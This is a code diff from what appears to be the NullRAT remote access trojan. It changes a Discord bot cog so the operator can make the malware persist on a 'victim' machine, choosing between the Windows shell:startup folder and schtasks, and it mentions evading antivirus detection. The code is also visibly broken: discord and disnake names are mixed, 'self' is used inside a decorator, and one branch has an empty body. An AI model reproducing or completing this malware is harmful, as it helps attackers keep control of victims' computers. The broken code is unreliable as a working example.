@@ -15,12 +15,11 @@ class Startup(commands.Cog):
         
     @commands.slash_command(
         description="Add NullRAT to startup directory",
-        options=[
-            discord.Option("victim", description="IP Address of specific victim", required=True)
-        ],
+        options=[self.bot.victim],
     )
     async def startup(self, ctx, victim):
         if str(victim) == str(self.ip_addr):
+            view = Confirm()
             await ctx.followup.send(
                 embed = self.bot.genEmbed(
                     "Choose method for starting up",
@@ -43,28 +42,30 @@ This method is less detected by antiviruses, but requires admin access to be gra
                     inline = False
                 ),
                 
-                view = 
+                view = view
             )
             
-class Confirm(disnake.ui.View):
+            await view.wait()
+            if view.legacy is None:
+                await ctx.channel.send("Timeout")
+            if view.legacy:
+                
+                
+class Confirm(discord.ui.View):
     def __init__(self):
         super().__init__()
-        self.value = None
+        self.legacy = None
 
-    # When the confirm button is pressed, set the inner value to `True` and
-    # stop the View from listening to more input.
-    # We also send the user an ephemeral message that we're confirming their choice.
-    @disnake.ui.button(label="Confirm", style=disnake.ButtonStyle.green)
-    async def confirm(self, button: disnake.ui.Button, interaction: disnake.MessageInteraction):
-        await interaction.response.send_message("Confirming", ephemeral=True)
-        self.value = True
+    @disnake.ui.button(label="shell:startup", style=discord.ButtonStyle.grey)
+    async def confirm(self, button: discord.ui.Button, interaction: discord.MessageInteraction):
+        await interaction.response.send_message("Using legacy method...")
+        self.legacy = True
         self.stop()
 
-    # This one is similar to the confirmation button except sets the inner value to `False`
-    @disnake.ui.button(label="Cancel", style=disnake.ButtonStyle.grey)
-    async def cancel(self, button: disnake.ui.Button, interaction: disnake.MessageInteraction):
-        await interaction.response.send_message("Cancelling", ephemeral=True)
-        self.value = False
+    @disnake.ui.button(label="schtasks", style=discord.ButtonStyle.grey)
+    async def cancel(self, button: discord.ui.Button, interaction: discord.MessageInteraction):
+        await interaction.response.send_message("Using modern method...")
+        self.legacy = False
         self.stop()
 
 def setup(bot: commands.Bot):
